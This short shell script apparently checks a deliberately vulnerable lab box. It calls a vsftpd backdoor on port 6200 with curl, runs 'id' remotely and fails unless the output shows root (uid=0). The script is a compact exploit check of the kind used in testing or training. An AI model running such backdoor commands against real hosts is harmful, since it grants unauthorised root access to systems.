set -eu
out=$(curl -fsS "http://${BOX_HOST}:6200/vsftpd/run?cmd=id")
echo "$out"
echo "$out" | grep -q 'uid=0' || { echo "vsftpd backdoor did not give root" >&2; exit 1; }
